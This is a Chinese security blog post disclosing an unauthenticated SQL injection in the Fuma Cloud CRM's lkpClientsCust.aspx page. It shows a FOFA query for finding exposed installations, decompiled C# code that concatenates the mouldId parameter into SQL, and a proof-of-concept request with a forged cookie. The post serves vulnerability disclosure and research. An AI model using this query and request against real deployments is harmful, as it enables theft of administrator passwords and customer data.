---
title: "孚盟云CRM lkpClientsCust.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-PagePopWindow-lkpClientsCust-sqli.html
asset_dir: assets/孚盟云crm-lkpclientscust.aspx-sql注入漏洞
---

# 孚盟云CRM lkpClientsCust.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/28 08:31
- 282浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

安全

SQL

计算机安全

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云lkpClientsCust.aspx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

客户关系管理

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `lkpClientsCust.aspx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **lkpClientsCust** 方法的实现如下

```
protected void Page_Load(object sender, EventArgs e)
{
  if (this.IsPostBack)
    return;
  this.DataStyleType = this.Request.QueryString["datastyletype"].ToString();
  this.mouldId = this.Request.QueryString["mouldId"].ToString();
  this.searchReturnField = this.Request.QueryString["searchfields"] == null ? "" : this.Request.QueryString["searchfields"];
  this.FilterSQL = this.Request.QueryString["FilterSQL"] == null ? "" : this.Request.QueryString["FilterSQL"].ToString();
  DataTable dataSource = new MouldDao().GetDataSource($"select DefaultValue from syListField where MouldID='{this.mouldId}' and FieldName='CType'");
  if (((InternalDataCollectionBase) dataSource.Rows).Count > 0)
    this.type = dataSource.Rows[0][0].ToString();
}
```

深入探索

服务器安全服务

Web安全书籍

云安全解决方案

参数如**mouldId**未过滤或校验就被直接拼接进SQL语句执行，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /PagePopWindow/lkpClientsCust.aspx?mouldId='SQLI_POC--&datastyletype= HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"admin","corpId": "1"}
```

[![孚盟云CRM lkpClientsCust.aspx SQL注入漏洞](images/img-001-e14845604a0c.webp)](https://image.mrxn.net/e1b02a840be0479e9fa7902d17035351.webp)

成功通过报错注入在响应回显当前数据库用户信息

SQL注入检测工具

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
